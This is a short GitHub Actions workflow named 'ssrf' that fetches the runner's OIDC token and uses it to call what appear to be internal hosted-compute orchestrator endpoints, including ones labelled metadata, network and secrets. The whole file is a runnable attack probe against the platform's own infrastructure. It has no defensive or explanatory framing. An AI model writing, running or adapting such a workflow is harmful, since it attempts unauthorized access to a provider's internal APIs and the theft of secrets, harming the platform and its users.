name: ssrf
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: internal api dig
        run: |
          OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro")
          TOKEN=$(echo $OIDC | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
          
          echo "=== VM/V1 ==="
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/status" \
            -H "Authorization: Bearer $TOKEN"
          
          echo "=== VM METADATA ==="
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/metadata" \
            -H "Authorization: Bearer $TOKEN"
          
          echo "=== VM NETWORK ==="
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/network" \
            -H "Authorization: Bearer $TOKEN"

          echo "=== VM SECRETS ==="
          curl -s "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/secrets" \
            -H "Authorization: Bearer $TOKEN"
